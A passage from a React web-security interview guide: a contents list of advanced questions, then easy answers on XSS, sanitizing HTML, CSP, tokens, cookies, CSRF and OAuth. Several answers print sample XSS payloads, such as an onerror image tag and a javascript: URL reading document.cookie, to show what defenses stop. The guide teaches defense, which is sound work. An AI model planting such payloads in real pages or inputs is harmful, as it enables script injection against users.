- [311: How can prototype pollution lead to XSS in a React app?](#311-how-can-prototype-pollution-lead-to-xss-in-a-react-app)
- [312: How can parsing nested query strings into props cause problems?](#312-how-can-parsing-nested-query-strings-into-props-cause-problems)
- [313: How do you safely support user-configured component layouts, like a dashboard builder?](#313-how-do-you-safely-support-user-configured-component-layouts-like-a-dashboard-builder)
- [314: Show how a script tag breakout works in SSR state and how to fix it.](#314-show-how-a-script-tag-breakout-works-in-ssr-state-and-how-to-fix-it)
- [315: What is the risk with getServerSideProps returning whole objects in the Next.js Pages Router?](#315-what-is-the-risk-with-getserversideprops-returning-whole-objects-in-the-nextjs-pages-router)
- [316: How can you inspect what an RSC page sends to the browser?](#316-how-can-you-inspect-what-an-rsc-page-sends-to-the-browser)
- [317: How does Next.js protect variables captured in Server Action closures?](#317-how-does-nextjs-protect-variables-captured-in-server-action-closures)
- [318: How are Server Actions exposed as endpoints, and what does that mean for security?](#318-how-are-server-actions-exposed-as-endpoints-and-what-does-that-mean-for-security)
- [319: How does Next.js protect Server Actions against CSRF, and what are the limits?](#319-how-does-nextjs-protect-server-actions-against-csrf-and-what-are-the-limits)
- [320: What lessons does React2Shell teach about RSC security?](#320-what-lessons-does-react2shell-teach-about-rsc-security)
- [321: What did the Next.js middleware bypass (CVE-2025-29927) teach about auth checks?](#321-what-did-the-nextjs-middleware-bypass-cve-2025-29927-teach-about-auth-checks)
- [322: Why is checking auth only in a Next.js layout not enough?](#322-why-is-checking-auth-only-in-a-nextjs-layout-not-enough)
- [323: How do you use experimental_taintUniqueValue to protect a secret?](#323-how-do-you-use-experimental_taintuniquevalue-to-protect-a-secret)
- [324: What are the limits of React's taint APIs?](#324-what-are-the-limits-of-reacts-taint-apis)
- [325: Describe an IDOR bug in a React and Server Components app and how to fix it.](#325-describe-an-idor-bug-in-a-react-and-server-components-app-and-how-to-fix-it)
- [326: How can caching leak one user's data to another in SSR or RSC apps?](#326-how-can-caching-leak-one-users-data-to-another-in-ssr-or-rsc-apps)
- [327: What is the token handler or BFF pattern for OIDC in SPAs and why is it recommended?](#327-what-is-the-token-handler-or-bff-pattern-for-oidc-in-spas-and-why-is-it-recommended)
- [328: Why is keeping tokens in memory not a complete defense against XSS?](#328-why-is-keeping-tokens-in-memory-not-a-complete-defense-against-xss)
- [329: How do you protect refresh tokens used directly in the browser?](#329-how-do-you-protect-refresh-tokens-used-directly-in-the-browser)
- [330: What is DPoP and how does it help SPAs?](#330-what-is-dpop-and-how-does-it-help-spas)
- [331: How does blocking third-party cookies affect silent authentication in SPAs?](#331-how-does-blocking-third-party-cookies-affect-silent-authentication-in-spas)
- [332: How do you prevent multiple tabs from refreshing the token at the same time?](#332-how-do-you-prevent-multiple-tabs-from-refreshing-the-token-at-the-same-time)
- [333: How should the OAuth callback page be secured?](#333-how-should-the-oauth-callback-page-be-secured)
- [334: What does an OIDC library check on the ID token, and what remains your job?](#334-what-does-an-oidc-library-check-on-the-id-token-and-what-remains-your-job)
- [335: How do you handle the redirect result in MSAL to avoid broken or insecure logins?](#335-how-do-you-handle-the-redirect-result-in-msal-to-avoid-broken-or-insecure-logins)
- [336: What should you expose in the Auth.js session callback?](#336-what-should-you-expose-in-the-authjs-session-callback)
- [337: How can a misconfigured OAuth redirect URI lead to account takeover?](#337-how-can-a-misconfigured-oauth-redirect-uri-lead-to-account-takeover)
- [338: How can an open redirect be chained with OAuth to steal codes or tokens?](#338-how-can-an-open-redirect-be-chained-with-oauth-to-steal-codes-or-tokens)
- [339: What tricks do attackers use to bypass naive open redirect checks?](#339-what-tricks-do-attackers-use-to-bypass-naive-open-redirect-checks)
- [340: When can SameSite cookies be bypassed for CSRF?](#340-when-can-samesite-cookies-be-bypassed-for-csrf)
- [341: How can CSRF still work against a JSON API?](#341-how-can-csrf-still-work-against-a-json-api)
- [342: What are common CORS misconfigurations that create real vulnerabilities?](#342-what-are-common-cors-misconfigurations-that-create-real-vulnerabilities)
- [343: Are api.example.com and app.example.com "cross-site" or "cross-origin"?](#343-are-apiexamplecom-and-appexamplecom-cross-site-or-cross-origin)
- [344: How should clickjacking protection work if your app must be embedded by partners?](#344-how-should-clickjacking-protection-work-if-your-app-must-be-embedded-by-partners)
- [345: How do you secure an OAuth popup login that uses postMessage?](#345-how-do-you-secure-an-oauth-popup-login-that-uses-postmessage)
- [346: How does COOP affect OAuth and payment popups?](#346-how-does-coop-affect-oauth-and-payment-popups)
- [347: How do you safely show fully untrusted user HTML, like user-built landing pages?](#347-how-do-you-safely-show-fully-untrusted-user-html-like-user-built-landing-pages)
- [348: What did recent npm supply chain attacks teach React teams?](#348-what-did-recent-npm-supply-chain-attacks-teach-react-teams)
- [349: What is npm provenance and trusted publishing?](#349-what-is-npm-provenance-and-trusted-publishing)
- [350: How can a minimum release age protect you from malicious packages?](#350-how-can-a-minimum-release-age-protect-you-from-malicious-packages)
- [351: How do pnpm and npm handle dependency install scripts differently?](#351-how-do-pnpm-and-npm-handle-dependency-install-scripts-differently)
- [352: How would you detect unexpected network calls added by a dependency to your bundle?](#352-how-would-you-detect-unexpected-network-calls-added-by-a-dependency-to-your-bundle)
- [353: What are the limits of SRI for third-party scripts?](#353-what-are-the-limits-of-sri-for-third-party-scripts)
- [354: Should you self-host third-party scripts instead of loading them from a CDN?](#354-should-you-self-host-third-party-scripts-instead-of-loading-them-from-a-cdn)
- [355: How can you limit what a third-party script can do in your page?](#355-how-can-you-limit-what-a-third-party-script-can-do-in-your-page)
- [356: How can errors during streaming SSR leak information?](#356-how-can-errors-during-streaming-ssr-leak-information)
- [357: How should a React app and its API agree on error responses?](#357-how-should-a-react-app-and-its-api-agree-on-error-responses)
- [358: How do browser extensions affect your app's security, and what can you do?](#358-how-do-browser-extensions-affect-your-apps-security-and-what-can-you-do)
- [359: How can React DevTools reveal data the user shouldn't see?](#359-how-can-react-devtools-reveal-data-the-user-shouldnt-see)
- [360: Why is exposing the store on window, like window.store, a problem?](#360-why-is-exposing-the-store-on-window-like-windowstore-a-problem)
- [361: Can secrets stay in memory after logout, and does it matter?](#361-can-secrets-stay-in-memory-after-logout-and-does-it-matter)
- [362: What does a full security testing strategy for a React app look like?](#362-what-does-a-full-security-testing-strategy-for-a-react-app-look-like)
- [363: Write a simple Semgrep rule that flags unsanitized dangerouslySetInnerHTML.](#363-write-a-simple-semgrep-rule-that-flags-unsanitized-dangerouslysetinnerhtml)
- [364: How do you fuzz a URL validator or sanitizer?](#364-how-do-you-fuzz-a-url-validator-or-sanitizer)
- [365: How would you threat model a new React feature?](#365-how-would-you-threat-model-a-new-react-feature)
- [366: How does OWASP A01 Broken Access Control show up in React apps?](#366-how-does-owasp-a01-broken-access-control-show-up-in-react-apps)
- [367: How does OWASP A05 Injection apply to the front end?](#367-how-does-owasp-a05-injection-apply-to-the-front-end)
- [368: How does OWASP A02 Security Misconfiguration apply to React apps?](#368-how-does-owasp-a02-security-misconfiguration-apply-to-react-apps)
- [369: How does OWASP A03 Software Supply Chain Failures apply to React apps?](#369-how-does-owasp-a03-software-supply-chain-failures-apply-to-react-apps)
- [370: How does OWASP A04 Cryptographic Failures relate to front-end code?](#370-how-does-owasp-a04-cryptographic-failures-relate-to-front-end-code)
- [371: How does OWASP A07 Authentication Failures show up in SPAs?](#371-how-does-owasp-a07-authentication-failures-show-up-in-spas)
- [372: How does OWASP A08 Software or Data Integrity Failures apply?](#372-how-does-owasp-a08-software-or-data-integrity-failures-apply)
- [373: How does OWASP A09 Security Logging and Alerting Failures apply to React apps?](#373-how-does-owasp-a09-security-logging-and-alerting-failures-apply-to-react-apps)
- [374: How does OWASP A10 Mishandling of Exceptional Conditions show up in React code?](#374-how-does-owasp-a10-mishandling-of-exceptional-conditions-show-up-in-react-code)
- [375: How does OWASP A06 Insecure Design show up in front-end features?](#375-how-does-owasp-a06-insecure-design-show-up-in-front-end-features)
- [376: A tester changes the price in a checkout request and pays 1 dollar for a 500 dollar order. How do you fix it?](#376-a-tester-changes-the-price-in-a-checkout-request-and-pays-1-dollar-for-a-500-dollar-order-how-do-you-fix-it)
- [377: A user changes /invoices/1001 to /invoices/1002 in the URL and sees another customer's invoice. What do you do?](#377-a-user-changes-invoices1001-to-invoices1002-in-the-url-and-sees-another-customers-invoice-what-do-you-do)
- [378: A stored XSS is found in comment rendering in production. How do you respond?](#378-a-stored-xss-is-found-in-comment-rendering-in-production-how-do-you-respond)
- [379: A secret API key was found in your production JavaScript bundle. What do you do?](#379-a-secret-api-key-was-found-in-your-production-javascript-bundle-what-do-you-do)
- [380: How would you migrate an app from tokens in localStorage to httpOnly cookies?](#380-how-would-you-migrate-an-app-from-tokens-in-localstorage-to-httponly-cookies)
- [381: How would you add a CSP to a legacy React app that has inline scripts and many third-party tools?](#381-how-would-you-add-a-csp-to-a-legacy-react-app-that-has-inline-scripts-and-many-third-party-tools)
- [382: Design a markdown preview feature for user posts that is secure.](#382-design-a-markdown-preview-feature-for-user-posts-that-is-secure)
- [383: A partner wants to embed part of your React app in their site. How do you do it securely?](#383-a-partner-wants-to-embed-part-of-your-react-app-in-their-site-how-do-you-do-it-securely)
- [384: Should an internal admin panel live in the same React SPA as the customer app?](#384-should-an-internal-admin-panel-live-in-the-same-react-spa-as-the-customer-app)
- [385: You find out a dependency you use was published with malicious code yesterday. What do you do?](#385-you-find-out-a-dependency-you-use-was-published-with-malicious-code-yesterday-what-do-you-do)
- [386: Users randomly get logged out after you enabled refresh token rotation. What is likely going on?](#386-users-randomly-get-logged-out-after-you-enabled-refresh-token-rotation-what-is-likely-going-on)
- [387: How do you keep tenants isolated in a multi-tenant React app?](#387-how-do-you-keep-tenants-isolated-in-a-multi-tenant-react-app)
- [388: How would you design a secure "log in as user" feature for support staff?](#388-how-would-you-design-a-secure-log-in-as-user-feature-for-support-staff)
- [389: How do you secure file download links in a React app?](#389-how-do-you-secure-file-download-links-in-a-react-app)
- [390: How do you handle sensitive data in an offline-capable PWA?](#390-how-do-you-handle-sensitive-data-in-an-offline-capable-pwa)
- [391: What security issues come with micro frontends?](#391-what-security-issues-come-with-micro-frontends)
- [392: A CDN cached an SSR page with one user's account details and served it to others. How do you prevent this?](#392-a-cdn-cached-an-ssr-page-with-one-users-account-details-and-served-it-to-others-how-do-you-prevent-this)
- [393: An attacker calls your Next.js Server Action directly with curl. What protects you?](#393-an-attacker-calls-your-nextjs-server-action-directly-with-curl-what-protects-you)
- [394: How should a React app handle a user-controlled theme with custom colors?](#394-how-should-a-react-app-handle-a-user-controlled-theme-with-custom-colors)
- [395: What are the risks of a form builder that renders UI from a server-provided JSON schema?](#395-what-are-the-risks-of-a-form-builder-that-renders-ui-from-a-server-provided-json-schema)
- [396: How do you safely render AI or LLM output in a React app?](#396-how-do-you-safely-render-ai-or-llm-output-in-a-react-app)
- [397: How do you build link previews in a chat app securely?](#397-how-do-you-build-link-previews-in-a-chat-app-securely)
- [398: What is login CSRF and how do you prevent it?](#398-what-is-login-csrf-and-how-do-you-prevent-it)
- [399: A malicious postinstall script ran in your CI. What could it have accessed and what do you do?](#399-a-malicious-postinstall-script-ran-in-your-ci-what-could-it-have-accessed-and-what-do-you-do)
- [400: Sentry source maps exposed internal comments and API routes. How do you change the process?](#400-sentry-source-maps-exposed-internal-comments-and-api-routes-how-do-you-change-the-process)
- [401: How would you implement step-up authentication for a sensitive action in React?](#401-how-would-you-implement-step-up-authentication-for-a-sensitive-action-in-react)
- [402: How can you detect and limit damage from stolen tokens?](#402-how-can-you-detect-and-limit-damage-from-stolen-tokens)
- [403: How would you review a third-party React UI component library before adopting it company-wide?](#403-how-would-you-review-a-third-party-react-ui-component-library-before-adopting-it-company-wide)
- [404: How do you share authorization rules between client and server without trusting the client?](#404-how-do-you-share-authorization-rules-between-client-and-server-without-trusting-the-client)
- [405: How do you avoid repeating auth lookups in Server Components while staying secure?](#405-how-do-you-avoid-repeating-auth-lookups-in-server-components-while-staying-secure)
- [406: How do you make secure options the default for your team's React code?](#406-how-do-you-make-secure-options-the-default-for-your-teams-react-code)
- [407: How would you design a secure environment config pipeline for a React app?](#407-how-would-you-design-a-secure-environment-config-pipeline-for-a-react-app)
- [408: How does React 19 treat javascript: URLs in form action and formAction props?](#408-how-does-react-19-treat-javascript-urls-in-form-action-and-formaction-props)
- [409: Why are iframe srcDoc and src props risky with user input?](#409-why-are-iframe-srcdoc-and-src-props-risky-with-user-input)
- [410: Can SVG elements in React be used for XSS?](#410-can-svg-elements-in-react-be-used-for-xss)
- [411: What is base tag injection and how does CSP help?](#411-what-is-base-tag-injection-and-how-does-csp-help)
- [412: What is dangling markup injection?](#412-what-is-dangling-markup-injection)
- [413: What is DOM clobbering and how does it affect sanitized HTML?](#413-what-is-dom-clobbering-and-how-does-it-affect-sanitized-html)
- [414: How can lookalike Unicode characters in URLs trick users?](#414-how-can-lookalike-unicode-characters-in-urls-trick-users)
- [415: Why is localStorage shared between apps on the same origin a problem?](#415-why-is-localstorage-shared-between-apps-on-the-same-origin-a-problem)
- [416: What is cookie tossing from a compromised subdomain?](#416-what-is-cookie-tossing-from-a-compromised-subdomain)
- [417: How can XSS persist through a service worker, and how do you clean up?](#417-how-can-xss-persist-through-a-service-worker-and-how-do-you-clean-up)
- [418: What does the Clear-Site-Data header do and when would you use it?](#418-what-does-the-clear-site-data-header-do-and-when-would-you-use-it)
- [419: Why might a user see private data after logout by pressing the back button?](#419-why-might-a-user-see-private-data-after-logout-by-pressing-the-back-button)
- [420: How can link prefetching cause security or privacy problems?](#420-how-can-link-prefetching-cause-security-or-privacy-problems)
- [421: How can a React Router loader create an open redirect?](#421-how-can-a-react-router-loader-create-an-open-redirect)
- [422: Why is checking auth in useEffect a weak guard?](#422-why-is-checking-auth-in-useeffect-a-weak-guard)
- [423: Why can parallel data fetching in Next.js run before an auth redirect?](#423-why-can-parallel-data-fetching-in-nextjs-run-before-an-auth-redirect)
- [424: How do you balance per-request security checks with performance?](#424-how-do-you-balance-per-request-security-checks-with-performance)
- [425: How do you rate limit Server Actions or route handlers?](#425-how-do-you-rate-limit-server-actions-or-route-handlers)
- [426: When does it make sense to use Web Crypto in a React app?](#426-when-does-it-make-sense-to-use-web-crypto-in-a-react-app)
- [427: How do you store encryption keys in the browser for an end-to-end encrypted app?](#427-how-do-you-store-encryption-keys-in-the-browser-for-an-end-to-end-encrypted-app)
- [428: How do passkeys (WebAuthn) improve security in React apps?](#428-how-do-passkeys-webauthn-improve-security-in-react-apps)
- [429: Why are client-side feature flags not a security control?](#429-why-are-client-side-feature-flags-not-a-security-control)
- [430: How can analytics leak personal data or tokens?](#430-how-can-analytics-leak-personal-data-or-tokens)
- [431: How do attackers find hidden routes and APIs in a React app?](#431-how-do-attackers-find-hidden-routes-and-apis-in-a-react-app)
- [432: How do you set security headers on common hosting platforms for React apps?](#432-how-do-you-set-security-headers-on-common-hosting-platforms-for-react-apps)
- [433: How do you deal with noisy CSP violation reports at scale?](#433-how-do-you-deal-with-noisy-csp-violation-reports-at-scale)
- [434: Your JavaScript bundle on the CDN was changed by an attacker. How do you respond?](#434-your-javascript-bundle-on-the-cdn-was-changed-by-an-attacker-how-do-you-respond)
- [435: How do you keep React and Next.js patched without slowing the team down?](#435-how-do-you-keep-react-and-nextjs-patched-without-slowing-the-team-down)
- [436: Why is "React is safe from XSS" a misleading statement?](#436-why-is-react-is-safe-from-xss-a-misleading-statement)
- [437: How would you define a "security definition of done" for React features?](#437-how-would-you-define-a-security-definition-of-done-for-react-features)
- [438: How do you protect against XSS in error messages shown by React?](#438-how-do-you-protect-against-xss-in-error-messages-shown-by-react)
- [439: How do you secure a React Native app differently from a React web app?](#439-how-do-you-secure-a-react-native-app-differently-from-a-react-web-app)
- [440: How do you handle CSRF when you use route handlers in Next.js with cookies?](#440-how-do-you-handle-csrf-when-you-use-route-handlers-in-nextjs-with-cookies)
- [441: What risks come with Next.js image optimization or other proxy endpoints?](#441-what-risks-come-with-nextjs-image-optimization-or-other-proxy-endpoints)
- [442: How do you prevent ReDoS in client-side and server-side validation?](#442-how-do-you-prevent-redos-in-client-side-and-server-side-validation)
- [443: How do you secure WebSocket or SSE-based real-time features in SSR React apps?](#443-how-do-you-secure-websocket-or-sse-based-real-time-features-in-ssr-react-apps)
- [444: How do you test an auth flow for common weaknesses before release?](#444-how-do-you-test-an-auth-flow-for-common-weaknesses-before-release)
- [445: How do you handle security for a React app that runs inside a WebView in a mobile app?](#445-how-do-you-handle-security-for-a-react-app-that-runs-inside-a-webview-in-a-mobile-app)
- [446: How do you prevent sensitive data from being indexed or cached by search engines and browsers?](#446-how-do-you-prevent-sensitive-data-from-being-indexed-or-cached-by-search-engines-and-browsers)
- [447: How do you approach security in a React app that uses GraphQL?](#447-how-do-you-approach-security-in-a-react-app-that-uses-graphql)
- [448: What security questions would you ask before adding a new auth library to a React project?](#448-what-security-questions-would-you-ask-before-adding-a-new-auth-library-to-a-react-project)
- [449: How do you explain to a product manager why a security fix delays a feature?](#449-how-do-you-explain-to-a-product-manager-why-a-security-fix-delays-a-feature)
- [450: What are the most important habits for building secure React apps?](#450-what-are-the-most-important-habits-for-building-secure-react-apps)

---

# Easy Questions (1-150)

## 1: What is XSS?

XSS (cross-site scripting) is when an attacker gets their own JavaScript to run on your page, in the browser of another user. Once their script runs, it has the same power as your own code: it can read data on the page, call your API as the logged-in user, change the UI or send data to the attacker's server.

It usually happens when user-controlled data (a comment, a URL parameter, a profile name) is put into the page as HTML or code instead of as plain text.

## 2: How does React protect you from XSS by default?

When you render a value inside JSX, React treats it as text, not HTML. On the client it sets the text through DOM APIs like `textContent`, and during server rendering it escapes characters like `<`, `>`, `&`, `"` and `'`.

```jsx
const comment = '<img src=x onerror="alert(1)">';

function Comment() {
  // Shows the string as text. No image, no alert.
  return <p>{comment}</p>;
}
```

So the most common XSS mistake, putting user strings into HTML, does not happen unless you go out of your way to do it.

## 3: What exactly does JSX auto-escaping cover?

It covers text children and attribute values. Strings you pass as children are shown as text, and strings you pass as props like `title`, `alt` or `className` are set as attribute values, so they cannot close the tag and add new attributes or elements.

It does not check what a value means. A string is still dangerous if the place where it ends up runs code or loads resources, for example `href`, `src`, `style` or `dangerouslySetInnerHTML`.

## 4: What are the limits of JSX auto-escaping?

Escaping only stops the value from becoming HTML markup. It does not help when:

- You use `dangerouslySetInnerHTML` with user HTML.
- You put a user URL into `href`, `src` or `action` (for example `javascript:` or a link to a phishing page).
- You touch the DOM directly with refs (`innerHTML`, `insertAdjacentHTML`).
- You spread user-controlled objects as props.
- A third-party library builds HTML strings for you (markdown renderers, rich text editors, chart tooltips).
- You use `eval`, `new Function` or `setTimeout` with a string.
- The bug is on the server, for example in how initial state is put into the HTML.

## 5: What is dangerouslySetInnerHTML?

It is the React prop that sets an element's `innerHTML` to a raw HTML string. It takes an object with an `__html` key.

```jsx
function Article({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

React does not escape or sanitize this string. If `html` contains `<img src=x onerror=...>`, the browser will run the handler.

## 6: Why does React give dangerouslySetInnerHTML such a long and scary name?

The name is a warning on purpose. It makes the risky code easy to spot in code review and easy to search for. The extra `{ __html: ... }` object also makes it harder to pass a raw string by accident. It does not make the HTML safe; it only makes the risk visible.

## 7: What is DOMPurify?

DOMPurify is a popular library that sanitizes HTML. You give it an HTML string, it parses it and removes anything that can run code, such as `<script>` tags, `on*` event handler attributes and `javascript:` URLs, and returns HTML that is safe to insert.

It is maintained by security researchers (Cure53) and is the usual choice when a React app must render user or CMS HTML.

## 8: How do you use DOMPurify with dangerouslySetInnerHTML?

Sanitize the string right before you render it.

```jsx
import DOMPurify from "dompurify";

function SafeHtml({ html }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

If the HTML is large or rendered often, wrap the sanitize call in `useMemo` so it does not run on every render.

## 9: What is a javascript: URL?

It is a URL that starts with `javascript:`. When the browser follows it, it runs the code after the colon instead of loading a page.

```html
<a href="javascript:alert(document.cookie)">Click me</a>
```

If a user can control a link's `href`, they can put a `javascript:` URL there and get code to run when someone clicks it. JSX escaping does not stop this because the value is a valid attribute value.

## 10: How does React 19 handle javascript: URLs?

React 16.9 started warning about `javascript:` URLs. React 19 blocks them. If you render something like `<a href="javascript:alert(1)">`, React replaces the URL with a `javascript:` URL that only throws an error saying React has blocked it as a security precaution, so the attacker's code does not run.

This applies to URL props such as `href`, `src`, `action` and `formAction`. It is a safety net, not a replacement for validating URLs yourself.

## 11: Is it safe to put user input into an href in React 19?

Safer than before, but not fully safe. React 19 stops `javascript:` URLs, but a user can still give you:

- A link to a phishing or malware site.
- A `data:` URL.
- A relative URL that hits a sensitive route in your app.

If links come from users, check that they use `http:` or `https:` and, if needed, that they point to domains you allow.

## 12: What is props spreading?

Props spreading is passing all keys of an object as props with the `{...obj}` syntax.

```jsx
const props = { id: "name", placeholder: "Your name" };
<input {...props} />;
```

It is handy for wrapper components that forward props to a DOM element.

## 13: Why is spreading user-controlled objects into props risky?

If the object comes from user input or an API you don't control, it can contain props you never meant to set, for example `dangerouslySetInnerHTML`, `href`, `src`, `formAction` or `style`.

```jsx
// userData comes from a JSON API
<div {...userData} />
// If userData = { dangerouslySetInnerHTML: { __html: '<img src=x onerror=alert(1)>' } }
// you have XSS.
```

Pick the fields you need instead of spreading the whole object.

## 14: What are refs in React?

A ref gives you a direct reference to a DOM node (or any value that should persist between renders). You create one with `useRef` and attach it with the `ref` prop.

```jsx
const inputRef = useRef(null);
<input ref={inputRef} />;
// later: inputRef.current.focus();
```

Refs are fine for focus, measuring size, scrolling and integrating non-React libraries.

## 15: Why is setting innerHTML through a ref risky?

When you use a ref to set `innerHTML`, you skip React's escaping completely. It has the same risk as `dangerouslySetInnerHTML`, but it is harder to find in code review because the name does not warn anyone.

```jsx
useEffect(() => {
  ref.current.innerHTML = userBio; // XSS if userBio contains HTML
}, [userBio]);
```

Use `textContent` for text, or sanitize the HTML first.

## 16: What is Content Security Policy (CSP)?

CSP is an HTTP response header that tells the browser which sources of scripts, styles, images, frames and other resources are allowed on the page. If an attacker manages to inject a script tag, CSP can stop the browser from running it.

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
```

It is a second layer of defense. It does not fix XSS bugs, but it makes many of them much harder to exploit.

## 17: How can you set a CSP for a React app?

The best way is the `Content-Security-Policy` HTTP response header, set by your server, CDN or hosting platform. You can also use a meta tag in `index.html`:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'"
/>
```

The meta tag does not support some directives, such as `frame-ancestors` and reporting, so the header is preferred.

## 18: What is a CSP nonce?

A nonce is a random value created for each response. You put it in the CSP header and on each script tag you trust. The browser only runs scripts that have the matching nonce.

```
Content-Security-Policy: script-src 'nonce-r4nd0m123'
```

```html
<script nonce="r4nd0m123" src="/app.js"></script>
```

An attacker who injects a script does not know the nonce, so their script is blocked. The nonce must be new and unpredictable on every request.

## 19: What does 'unsafe-inline' mean in CSP?

`'unsafe-inline'` allows inline scripts (`<script>...</script>`, `onclick="..."`) or inline styles, depending on the directive. Using it in `script-src` removes most of the XSS protection CSP gives you, because injected inline scripts would run too. Avoid it for scripts. For styles it is less dangerous but still worth avoiding when you can.

## 20: What are Trusted Types?

Trusted Types is a browser API, enabled with a CSP directive, that stops you from passing plain strings into dangerous DOM sinks like `innerHTML`, `outerHTML` or `script.src`. Instead you must pass special objects (`TrustedHTML`, `TrustedScript`, `TrustedScriptURL`) created by a policy you define.

```
Content-Security-Policy: require-trusted-types-for 'script'
```

This turns DOM XSS mistakes into errors you can see, and it forces all HTML insertion to go through a small number of reviewed places.

## 21: Why can markdown renderers cause XSS?

Markdown allows raw HTML and links. If a renderer turns user markdown into HTML and you insert it with `dangerouslySetInnerHTML`, any `<script>`, `<img onerror>` or `[link](javascript:...)` in the markdown can end up running.

The risk is in how the library is configured. Some libraries pass raw HTML through by default, and some only sanitize when you add a plugin.

## 22: Is react-markdown safe by default?

Mostly yes. `react-markdown` builds React elements instead of an HTML string, so it does not use `dangerouslySetInnerHTML`. By default it ignores raw HTML in the markdown, and its default `urlTransform` removes dangerous URL protocols like `javascript:`.

It becomes risky when you add `rehype-raw` to allow HTML without also adding `rehype-sanitize`, or when you override `urlTransform` to allow everything.

## 23: What is a JWT?

A JWT (JSON Web Token) is a compact, URL-safe token that holds JSON claims, such as the user ID, roles and expiration time. It is signed so the server can check that it was not changed. JWTs are often used as access tokens or ID tokens.

## 24: What are the three parts of a JWT?

A JWT has three base64url-encoded parts separated by dots:

1. **Header**: the token type and signing algorithm, for example `{"alg":"RS256","typ":"JWT"}`.
2. **Payload**: the claims, for example `sub`, `exp`, `iat`, `roles`.
3. **Signature**: made from the header and payload with a secret or private key.

```
xxxxx.yyyyy.zzzzz
```

## 25: Is the payload of a JWT encrypted?

No, not for a normal signed JWT (JWS). The payload is only base64url-encoded, so anyone who has the token can read it, for example on jwt.io. Never put secrets or sensitive personal data in a JWT payload. If you need the contents hidden, use an encrypted JWT (JWE), but most apps just keep sensitive data on the server.

## 26: Where can a React app store an auth token?

The common options are:

- **Memory** (a variable, React state or context): gone on page reload.
- **localStorage**: persists until removed, readable by any script on the origin.
- **sessionStorage**: per tab, cleared when the tab closes, readable by any script on the origin.
- **Cookies**: sent automatically with requests. With the `HttpOnly` flag, JavaScript cannot read them.

Each option has trade-offs between XSS risk, CSRF risk and convenience.

## 27: Why is storing tokens in localStorage considered risky?

Any JavaScript on your origin can read localStorage. If you have one XSS bug, or one compromised npm package or third-party script, the attacker can read the token and send it to their server. They can then use it from their own machine until it expires.

That said, an XSS bug is serious no matter where the token lives, because the attacker can also make requests from inside the page.

## 28: What is an httpOnly cookie?

It is a cookie with the `HttpOnly` attribute. The browser sends it with matching requests, but JavaScript cannot read it through `document.cookie`.

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
```

This means an XSS attack cannot steal the token value. The attacker can still make requests from the victim's browser while the page is open.

## 29: What does the Secure attribute on a cookie do?

`Secure` tells the browser to send the cookie only over HTTPS (localhost is an exception in modern browsers). This stops the cookie from leaking over plain HTTP connections, where anyone on the network could read it. Auth cookies should always be `Secure`.

## 30: What is CSRF?

CSRF (cross-site request forgery) is when another website makes the user's browser send a request to your site. If your site uses cookies for auth, the browser attaches them automatically, so the request runs as the logged-in user.

For example, an evil page could auto-submit a hidden form that posts to `https://bank.example/transfer`. CSRF is mainly a problem when auth is cookie-based.

## 31: What is the SameSite cookie attribute?

`SameSite` controls whether a cookie is sent with requests that come from another site. It is the main browser-level defense against CSRF.

```
Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly
```

With `Lax` or `Strict`, a form on `evil.example` that posts to your site will not include the cookie.

## 32: What are the possible SameSite values?

- **Strict**: the cookie is only sent when the request comes from the same site. Even clicking a link from another site to yours will not send it.
- **Lax**: sent on same-site requests and on top-level GET navigations from other sites (clicking a link), but not on cross-site POSTs, iframes, or fetch calls.
- **None**: sent on all requests, including cross-site. It must be combined with `Secure`.

`Lax` is a good default for session cookies.

## 33: What is an anti-CSRF token?

It is a random value the server gives to the client and expects back on every request that changes data, usually in a header or form field. An attacker on another site cannot read this value, so their forged requests fail the check.

```js
fetch("/api/profile", {
  method: "POST",
  headers: { "X-CSRF-Token": csrfToken, "Content-Type": "application/json" },
  body: JSON.stringify(data),
  credentials: "include",
});
```

## 34: What is a protected route in React?

A protected route is a page that should only be shown to logged-in users or users with a certain role. In React it is usually done with a wrapper component, a router loader or middleware that checks the auth state and redirects to the login page if needed.

## 35: Can a client-side route guard keep data secure?

No. The guard only controls what the UI shows. The JavaScript for the protected page is still in the bundle, and anyone can change state in DevTools or call your API directly with curl. Real protection has to happen on the server: every API endpoint must check who the user is and what they are allowed to do. Route guards are for user experience.

## 36: How do you redirect an unauthenticated user with React Router?

In a loader you can throw or return `redirect`:

```jsx
import { redirect } from "react-router";

export async function loader({ request }) {
  const user = await getUser(request);
  if (!user) {
    const url = new URL(request.url);
    throw redirect(`/login?returnTo=${encodeURIComponent(url.pathname)}`);
  }
  return { user };
}
```

In a component you can render `<Navigate to="/login" replace />`.

## 37: What is role-based UI rendering?

It means showing or hiding parts of the UI based on the user's role or permissions, for example only showing a "Delete user" button to admins.

```jsx
{
  user.roles.includes("admin") && (
    <button onClick={deleteUser}>Delete user</button>
  );
}
```

It improves the user experience, but it is not a security control by itself.

## 38: Why is hiding a button not the same as authorization?

Hiding the button only changes what the user sees. Anyone can open DevTools, find the API call in the bundle or the network tab, and send the request themselves. The server must check permissions on every request. If the server does not check, the hidden button gives no protection at all.

## 39: What is the difference between authentication and authorization?

- **Authentication** answers "who are you?" It is login: passwords, passkeys, OAuth, MFA.
- **Authorization** answers "what are you allowed to do?" It is checking roles, permissions and ownership, for example whether this user can edit this document.

Both must be enforced on the server. The React app can only reflect the results.

## 40: What is OAuth 2.0?

OAuth 2.0 is a standard for delegated authorization. It lets an app get an access token to call an API on behalf of a user, without the app ever seeing the user's password. The user logs in at the authorization server (for example Auth0, Microsoft Entra ID, Google), and the app gets a token with limited scopes.

## 41: What is OpenID Connect (OIDC)?

OIDC is a layer on top of OAuth 2.0 that adds authentication. Besides the access token, it gives you an ID token (a JWT) with information about who logged in, and a standard `userinfo` endpoint. "Sign in with Google" and most enterprise SSO use OIDC.

## 42: What is PKCE?

PKCE (Proof Key for Code Exchange, said "pixy") protects the OAuth authorization code flow for public clients like SPAs and mobile apps that cannot keep a client secret.

The app creates a random `code_verifier`, sends a hash of it (`code_challenge`) when starting login, and sends the original verifier when exchanging the code for tokens. If an attacker steals the authorization code, they cannot use it without the verifier. Today PKCE is recommended for all OAuth clients.

## 43: Why is the OAuth implicit flow no longer recommended?

